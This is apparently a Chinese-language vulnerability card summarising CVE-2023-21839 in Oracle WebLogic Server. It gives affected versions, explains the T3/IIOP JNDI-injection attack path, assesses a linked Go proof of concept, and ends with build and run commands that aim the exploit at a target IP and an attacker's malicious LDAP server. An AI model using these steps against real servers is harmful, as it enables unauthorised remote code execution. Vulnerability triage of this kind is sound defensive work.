## CVE-2023-21839-Oracle WebLogic Server-RCE

**漏洞编号:** CVE-2023-21839

**漏洞类型:** 远程代码执行

**影响应用:** Oracle WebLogic Server

**危害等级:** 高危，允许未授权的攻击者通过网络访问执行任意代码

**影响版本:** 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0

**利用条件:** 需要目标WebLogic Server监听T3或IIOP协议，且攻击者能够通过网络访问这些端口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-21839是Oracle WebLogic Server中的一个远程代码执行漏洞，存在于Core组件中。未经身份验证的攻击者可以通过T3或IIOP协议利用此漏洞，从而获取对WebLogic Server的未授权访问，可能导致敏感数据泄露或完全控制目标系统。漏洞利用代码通过构造特定的GIOP消息，绕过身份验证，并利用JNDI注入执行任意代码。 

**有效性：**根据漏洞描述和利用代码分析，提供的POC代码是有效的。搜索引擎结果也表明该漏洞已被广泛研究和利用。

**投毒风险：**分析POC代码内容，主要的代码是构造GIOP协议数据包进行漏洞利用。其中最关键的是让目标weblogic服务器去连接攻击者指定的ldap服务器，存在ldap服务器投毒的风险。整体代码结构相对简单，未发现明显的恶意代码。`go.mod` 文件声明了模块名称和go版本，未发现异常。`constant.go`定义了一些常量，主要和GIOP协议相关，也无异常。投毒风险评估为10%，主要来自引用的外部JNDI服务。

**利用方式：**

1.  **协议利用：** 漏洞利用通过T3或IIOP协议发送特制的GIOP（General Inter-ORB Protocol）消息。
2.  **绕过认证：**  漏洞允许未经身份验证的攻击者利用，表明存在身份验证绕过。
3.  **JNDI注入：**  攻击者通过JNDI（Java Naming and Directory Interface）注入执行远程代码。攻击者搭建一个恶意的LDAP服务器，当WebLogic Server尝试从该服务器检索对象时，会执行攻击者控制的代码。
4.  **RCE：** 成功利用漏洞后，攻击者可以在受影响的WebLogic Server上执行任意代码。
5.  **Go语言实现:** POC使用Go语言编写，直接通过Socket进行协议构造，无需Java依赖。
6.  **NAT穿透:** POC声称解决了IIOP的NAT网络问题，使得在Docker和公网目标上进行测试成为可能。

**使用方法：**

1.  编译Go代码：`go build -o CVE-2023-21839`
2.  运行编译后的程序：`./CVE-2023-21839 -ip <target_ip> -port <target_port> -ldap <ldap_url>`，其中`<target_ip>`是目标WebLogic Server的IP地址，`<target_port>`是T3或IIOP端口（通常是7001），`<ldap_url>`是攻击者搭建的恶意LDAP服务器的URL。

**项目地址:** [ASkyeye/CVE-2023-21839](https://github.com/ASkyeye/CVE-2023-21839)

**漏洞详情:** [CVE-2023-21839](https://nvd.nist.gov/vuln/detail/CVE-2023-21839)